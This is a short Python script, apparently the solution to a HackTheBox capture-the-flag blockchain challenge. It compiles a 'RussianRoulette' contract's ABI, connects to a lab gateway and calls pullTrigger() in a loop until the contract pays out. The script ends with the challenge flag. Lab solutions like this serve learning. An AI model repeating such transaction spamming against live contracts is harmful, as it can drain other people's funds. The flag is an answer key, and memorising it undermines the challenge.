from web3 import Web3
from solcx import compile_source, install_solc

# installs solc compiler, necessary only for first execution
install_solc("0.8.23")

# compiles source code to get the contract abi
with open("RussianRoulette.sol", "rt") as fp:
    src = fp.read()
compiled = compile_source(src, output_values=["abi"])
contract_id, contract_interface = compiled.popitem()
abi = contract_interface['abi']

# contract adress (given in the tcp interface)
target = '0x47c32e2979505AC19b52B296be25dC0fF721a271'

w3 = Web3(Web3.HTTPProvider("http://83.136.249.138:50663")) # blockchain gateway from tcp interface
contract = w3.eth.contract(address=target, abi=abi)
for i in range(256):
    print(i)
    contract.functions.pullTrigger().transact() # you can stop at about 20+

#HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}
